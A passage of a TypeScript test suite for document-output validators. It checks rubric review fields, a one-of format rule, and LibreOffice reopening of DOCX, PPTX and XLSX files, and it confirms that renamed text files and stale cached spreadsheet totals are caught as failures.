    for (const reviewer of ["your name", "TBD", "n/a", "<name>"]) assert.ok(failed(validateRubric(spec, { ...review, reviewer }, artifacts, "executor-a"), "rubric:reviewer"), reviewer);
    for (const reviewedAt of ["yesterday", "2026-13-01", "2026-02-30", ""]) assert.ok(failed(validateRubric(spec, { ...review, reviewedAt }, artifacts, "executor-a"), "reviewed-at"), reviewedAt);
    assert.ok(allPass(validateRubric(spec, { ...review, reviewedAt: "2026-10-25" }, artifacts, "executor-a")));
  });
});

describe("one_of and office reopen", () => {
  it("one_of passes when any accepted form fully passes", async () => {
    const dir = outputs();
    cpSync(path.join(FIXTURES_DIR, "files/pilot-report.pdf"), path.join(dir, "report.pdf"));
    const spec: ValidatorSpec = { kind: "one_of", label: "html or pdf", options: [[{ kind: "html", file: "report.html" }], [{ kind: "pdf", file: "report.pdf", requiredText: ["Governance"] }]] };
    assert.ok(allPass(await run(spec, dir)));
    rmSync(path.join(dir, "report.pdf"));
    assert.ok(failed(await run(spec, dir), "one-of"));
  });

  it("office reopen is not_run without LibreOffice, never a silent pass", async () => {
    const dir = outputs();
    mkdirSync(dir, { recursive: true });
    writeFileSync(path.join(dir, "memo.docx"), "x");
    assert.deepEqual(statuses(await run({ kind: "office_reopen", file: "memo.docx", format: "docx" }, dir, { officeReopen: true, soffice: null })), ["not_run"]);
    assert.deepEqual(statuses(await run({ kind: "office_reopen", file: "memo.docx", format: "docx" }, dir, { officeReopen: false, soffice: "/usr/bin/soffice" })), ["not_run"]);
  });
});

describe("office reopen with LibreOffice", () => {
  const soffice = findSoffice();
  const skip = soffice ? false : "LibreOffice (soffice) is not installed here";
  const reopen = (spec: ValidatorSpec, dir: string) => run(spec, dir, { officeReopen: true, soffice });
  const docx = () =>
    Packer.toBuffer(new Document({ sections: [{ children: [new Paragraph({ text: "Decision", heading: HeadingLevel.HEADING_1 }), new Paragraph("Maya owns the EUR 2,400 follow-up.")] }] }));
  async function book(cached: number) {
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet("S");
    ws.addRow(["a", 100]);
    ws.addRow(["b", 200]);
    ws.getCell("B3").value = { formula: "B1+B2", result: cached };
    return Buffer.from(await wb.xlsx.writeBuffer());
  }
  async function deck() {
    const pptx = new PptxGenJS();
    pptx.layout = "LAYOUT_16x9";
    pptx.addSlide().addText("Maya owns the follow-up", { x: 0.5, y: 0.5, w: 9, h: 1, fontSize: 24 });
    return Buffer.from((await pptx.write({ outputType: "nodebuffer" })) as ArrayBuffer);
  }

  it("docx: a real document renders; a text file named .docx does not reopen", { skip }, async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "memo.docx"), await docx());
    const good = await reopen({ kind: "office_reopen", file: "memo.docx", format: "docx", pages: { max: 2 } }, dir);
    assert.ok(allPass(good), JSON.stringify(good));
    // Without an explicit import filter LibreOffice falls back to a text import and "renders" this.
    writeFileSync(path.join(dir, "fake.docx"), "PK not really a docx\nMaya owns the follow-up.\n");
    const fake = await reopen({ kind: "office_reopen", file: "fake.docx", format: "docx", pages: { max: 2 } }, dir);
    assert.deepEqual(statuses(fake), ["fail"], JSON.stringify(fake));
    assert.match(fake[0].detail, /MS Word 2007 XML/);
  });

  it("pptx: a real deck renders; a text file named .pptx does not reopen", { skip }, async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "d.pptx"), await deck());
    const good = await reopen({ kind: "office_reopen", file: "d.pptx", format: "pptx", pages: { min: 1, max: 1 } }, dir);
    assert.ok(allPass(good), JSON.stringify(good));
    writeFileSync(path.join(dir, "fake.pptx"), "Slide 1: Maya owns the follow-up\n");
    assert.deepEqual(statuses(await reopen({ kind: "office_reopen", file: "fake.pptx", format: "pptx" }, dir)), ["fail"]);
  });

  it("xlsx: an honest cache passes, a stale cached total fails, a CSV named .xlsx does not reopen", { skip }, async () => {
    const dir = outputs();
    writeFileSync(path.join(dir, "honest.xlsx"), await book(300));
    writeFileSync(path.join(dir, "stale.xlsx"), await book(999));
    writeFileSync(path.join(dir, "fake.xlsx"), "a,100\nb,200\ntotal,300\n");
    const honest = await reopen({ kind: "office_reopen", file: "honest.xlsx", format: "xlsx", recalcValues: [300] }, dir);
    assert.ok(allPass(honest), JSON.stringify(honest));
    const stale = await reopen({ kind: "office_reopen", file: "stale.xlsx", format: "xlsx", recalcValues: [300] }, dir);
    assert.ok(failed(stale, "no-stale-cache"), JSON.stringify(stale));
    assert.match(stale.find((c) => c.id.endsWith("no-stale-cache"))!.detail, /cached 999 but computes 300/);
    assert.deepEqual(statuses(await reopen({ kind: "office_reopen", file: "fake.xlsx", format: "xlsx", recalcValues: [300] }, dir)), ["fail"]);
  });
});
